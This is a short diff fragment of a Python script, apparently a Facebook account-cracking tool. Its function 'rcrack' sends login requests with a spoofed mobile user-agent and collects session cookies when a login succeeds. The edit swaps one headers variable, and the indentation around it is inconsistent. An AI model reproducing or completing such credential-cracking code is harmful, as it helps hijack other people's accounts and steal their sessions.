@@ -247,7 +247,7 @@ def rcrack(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
 
-response = requests.get('https://free.facebook.com/login', cookies=cookies, headers=headers_freefb).text
+response = requests.get('https://free.facebook.com/login', cookies=cookies, headers=headers)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
